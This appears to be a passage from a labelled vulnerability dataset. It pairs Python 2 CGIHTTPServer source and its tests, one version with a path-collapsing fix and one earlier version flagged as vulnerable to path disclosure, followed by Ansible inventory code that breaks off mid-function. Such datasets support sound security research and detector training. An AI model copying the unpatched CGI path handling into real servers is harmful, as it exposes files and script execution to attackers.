                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0,path_disclosure
27,9,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1,path_disclosure
28,36,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
